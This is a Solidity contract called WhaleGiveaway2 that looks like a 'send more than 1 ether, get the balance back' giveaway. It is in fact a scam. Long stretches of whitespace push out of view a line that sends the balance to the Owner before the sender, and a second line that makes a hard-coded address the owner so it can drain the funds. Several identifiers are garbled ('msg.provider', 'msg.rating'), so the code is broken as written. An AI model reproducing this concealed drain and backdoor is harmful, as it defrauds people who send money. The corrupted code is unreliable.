pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.provider;

    function()
    public
    payable
    {

    }

    function DiagnoseFreebie()
    public
    payable
    {
        if(msg.rating>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
            msg.provider.transfer(this.balance);
        }
    }

    function extractSpecimen()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.provider==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.provider == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes record)
    payable
    public
    {
        require(msg.provider == Owner);
        adr.call.rating(msg.rating)(record);
    }
}